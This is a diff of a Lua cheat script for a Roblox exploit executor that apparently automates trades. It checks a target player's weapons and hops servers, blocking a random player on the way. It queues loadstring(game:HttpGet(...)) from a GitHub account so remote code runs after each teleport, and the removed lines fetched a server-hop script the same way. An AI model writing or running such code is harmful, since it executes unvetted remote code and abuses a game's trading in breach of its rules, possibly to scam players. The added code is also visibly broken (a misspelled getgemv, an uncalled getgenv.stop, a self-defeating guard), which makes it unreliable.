@@ -1,23 +1,35 @@
-_G.gg = _G.gg or false
-if _G.gg then
+getgenv().gg = false
+if getgenv().gg then
     print("already")
     return
 end
-_G.gg = true
+getgenv().gg = true
 repeat wait() until game:IsLoaded()
-repeat wait() until game.Players.LocalPlayer:FindFirstChild("PlayerGui") and game.Players.LocalPlayer.Character and game.Players.LocalPlayer.Character:FindFirstChild("Humanoid")
-
-function missing(t, f, fallback)
-    if type(f) == t then return f end
-    return fallback
-end
-offer = false
-queueteleport =  missing("function", queue_on_teleport or (syn and syn.queue_on_teleport) or (fluxus and fluxus.queue_on_teleport))
-
-print("PlayerGui и Humanoid загружены!")
-
+game.Players.LocalPlayer.OnTeleport:Connect(function()
+    if queueteleport then
+        queueteleport("loadstring(game:HttpGet('https://github.com/Roma77799/testik/raw/refs/heads/main/test1',true))()")
+    else
+        print("queue нету")
+    end
+end)
+local TeleportService = game:GetService("TeleportService")
 local player = game:GetService("Players").LocalPlayer
-local playerGui = player:WaitForChild("PlayerGui")
+local playerGui = player:WaitForChild("PlayerGui",100)
+if not playerGui then
+    TeleportService:Teleport(18845424641)
+end
+local startTime = tick()
+repeat
+    task.wait(0.5)
+until not playerGui:FindFirstChild("Loading") or (tick() - startTime) >= 60
+
+if playerGui:FindFirstChild("Loading") then
+    warn("Loading не убрался за 60 секунд, перезаход...")
+    TeleportService:Teleport(18845424641)
+end
+
+offer = false
+getgenv().stop = false
 
 repeat
     wait(2)
@@ -198,13 +210,6 @@ function deletePaste()
     end
 end
 
-game.Players.LocalPlayer.OnTeleport:Connect(function()
-    if queueteleport then
-        queueteleport("loadstring(game:HttpGet('https://github.com/Roma77799/testik/raw/refs/heads/main/test1',true))()")
-    else
-        print("queue нету")
-    end
-end)
 local ReplicatedStorage = game:GetService("ReplicatedStorage")
 local Trade = ReplicatedStorage:WaitForChild("Trade")
 
@@ -227,7 +232,16 @@ task.spawn(function()
         if now - startTime >= 110 then
             print("❌ В течение 120 секунд статус не стал 'StartTrade'.")
             deletePaste()
-            loadstring(game:HttpGet('https://raw.githubusercontent.com/Roma77799/Secrethub/refs/heads/main/OtherSCRIPTS/ServerHop', true))()
+            if getgenv.stop then
+                print("already hop")
+                return
+            end
+            getgemv().stop = true
+            local plrs = Players:GetPlayers()
+            local target = plrs[math.random(#plrs)]
+
+            StarterGui:SetCore("PromptBlockPlayer", target)
+            TeleportService:Teleport(game.PlaceId)
             break
         end
     end
@@ -245,7 +259,16 @@ local function checkPlayer()
         if LocalPlayer then
             print("Игрок " .. targetName .. " не найден в игре!")
             deletePaste()
-            loadstring(game:HttpGet(('https://raw.githubusercontent.com/Roma77799/Secrethub/refs/heads/main/OtherSCRIPTS/ServerHop'),true))()
+            if getgenv.stop then
+                print("already hop")
+                return
+            end
+            getgemv().stop = true
+            local plrs = Players:GetPlayers()
+            local target = plrs[math.random(#plrs)]
+
+            StarterGui:SetCore("PromptBlockPlayer", target)
+            TeleportService:Teleport(game.PlaceId)
             return
         end
     end
@@ -285,7 +308,16 @@ local function checkInventory()
     if not hasAnyWeapon or isOnlyDefault then
         deletePaste()
         print("все пусто! (только дефолт остался)")
-        loadstring(game:HttpGet("https://raw.githubusercontent.com/Roma77799/Secrethub/refs/heads/main/OtherSCRIPTS/ServerHop", true))()
+        if getgenv.stop then
+            print("already hop")
+            return
+        end
+        getgemv().stop = true
+        local plrs = Players:GetPlayers()
+        local target = plrs[math.random(#plrs)]
+
+        StarterGui:SetCore("PromptBlockPlayer", target)
+        TeleportService:Teleport(game.PlaceId)
         return
     else
         print("Игрок имеет оружие!")
